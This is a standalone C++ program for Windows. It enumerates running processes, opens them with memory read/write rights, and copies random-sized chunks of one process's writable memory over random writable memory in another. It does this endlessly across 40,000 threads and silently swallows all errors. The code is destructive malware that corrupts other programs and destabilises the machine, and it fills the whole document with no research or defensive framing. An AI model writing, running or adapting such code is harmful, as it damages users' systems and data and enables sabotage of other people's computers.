#include <windows.h>
#include <psapi.h>
#include <iostream>
#include <vector>
#include <string>
#include <random>
#include <thread>
#include <mutex>
#include <algorithm>
#include <chrono>

// Mutex for synchronized output to the console
std::mutex cout_mutex;

// Generate a random integer
int random_int(int min, int max) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(min, max);
    return dis(gen);
}

// Get a list of all running processes, excluding the current process
std::vector<DWORD> get_process_list() {
    std::vector<DWORD> process_list(1024);
    DWORD bytes_needed;
    DWORD current_pid = GetCurrentProcessId(); // Get the current process ID
    if (!EnumProcesses(process_list.data(), process_list.size() * sizeof(DWORD), &bytes_needed)) {
        return {};
    }
    process_list.resize(bytes_needed / sizeof(DWORD));
    // Remove the current process ID from the list
    process_list.erase(
        std::remove_if(process_list.begin(), process_list.end(),
            [current_pid](DWORD pid) { return pid == current_pid; }),
        process_list.end()
    );
    return process_list;
}

// Get a handle to a process
HANDLE open_process(DWORD pid) {
    return OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, pid);
}

// Read a memory region from a process
std::vector<BYTE> read_memory(HANDLE process_handle, LPCVOID base_address, SIZE_T size) {
    std::vector<BYTE> buffer(size);
    SIZE_T bytes_read;
    if (ReadProcessMemory(process_handle, base_address, buffer.data(), size, &bytes_read)) {
        buffer.resize(bytes_read);
    } else {
        buffer.clear();
    }
    return buffer;
}

// Write a memory region to a process
bool write_memory(HANDLE process_handle, LPVOID base_address, const std::vector<BYTE>& buffer) {
    SIZE_T bytes_written;
    return WriteProcessMemory(process_handle, base_address, buffer.data(), buffer.size(), &bytes_written);
}

// Get writable memory regions of a process
std::vector<MEMORY_BASIC_INFORMATION> get_writable_memory_regions(HANDLE process_handle) {
    std::vector<MEMORY_BASIC_INFORMATION> regions;
    MEMORY_BASIC_INFORMATION mbi;
    LPCVOID address = nullptr;
    while (VirtualQueryEx(process_handle, address, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READWRITE)) {
            regions.push_back(mbi);
        }
        address = static_cast<LPCBYTE>(mbi.BaseAddress) + mbi.RegionSize;
    }
    return regions;
}

// Manipulate process memory by reading from one process and writing to another
void manipulate_process_memory(DWORD source_pid, DWORD target_pid) {
    try {
        HANDLE source_handle = open_process(source_pid);
        HANDLE target_handle = open_process(target_pid);
        if (!source_handle || !target_handle) {
            if (source_handle) CloseHandle(source_handle);
            if (target_handle) CloseHandle(target_handle);
            return;
        }
        std::vector<MEMORY_BASIC_INFORMATION> source_regions = get_writable_memory_regions(source_handle);
        std::vector<MEMORY_BASIC_INFORMATION> target_regions = get_writable_memory_regions(target_handle);
        if (source_regions.empty() || target_regions.empty()) {
            CloseHandle(source_handle);
            CloseHandle(target_handle);
            return;
        }
        MEMORY_BASIC_INFORMATION source_region = source_regions[random_int(0, source_regions.size() - 1)];
        MEMORY_BASIC_INFORMATION target_region = target_regions[random_int(0, target_regions.size() - 1)];
        SIZE_T size = static_cast<SIZE_T>(random_int(1, static_cast<int>(std::min(source_region.RegionSize, target_region.RegionSize))));
        std::vector<BYTE> buffer = read_memory(source_handle, source_region.BaseAddress, size);
        if (!buffer.empty()) {
            write_memory(target_handle, target_region.BaseAddress, buffer);
        }
        CloseHandle(source_handle);
        CloseHandle(target_handle);
    } catch (...) {
        // Catch any exceptions to prevent the program from exiting
    }
}

// Worker thread function to manipulate process memory
void worker_thread() {
    std::vector<DWORD> seen_pids;
    while (true) {
        try {
            std::vector<DWORD> current_pids = get_process_list();
            std::vector<DWORD> new_pids;
            for (DWORD pid : current_pids) {
                if (std::find(seen_pids.begin(), seen_pids.end(), pid) == seen_pids.end()) {
                    new_pids.push_back(pid);
                    seen_pids.push_back(pid);
                }
            }
            if (new_pids.size() > 1) {
                DWORD source_pid = new_pids[random_int(0, new_pids.size() - 1)];
                DWORD target_pid = new_pids[random_int(0, new_pids.size() - 1)];
                while (target_pid == source_pid) {
                    target_pid = new_pids[random_int(0, new_pids.size() - 1)];
                }
                std::lock_guard<std::mutex> lock(cout_mutex);
                std::cout << "Manipulating memory from PID " << source_pid << " to PID " << target_pid << std::endl;
                manipulate_process_memory(source_pid, target_pid);
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        } catch (...) {
            // Catch any exceptions to prevent the thread from exiting
        }
    }
}

int main() {
    const int num_threads = 40000; // Note: This is extremely high and likely problematic
    std::vector<std::thread> threads;
    try {
        for (int i = 0; i < num_threads; ++i) {
            threads.emplace_back(worker_thread);
        }
        for (auto& t : threads) {
            t.join();
        }
    } catch (const std::exception& e) {
        std::cerr << "Exception in main: " << e.what() << std::endl;
    }
    return 0;
}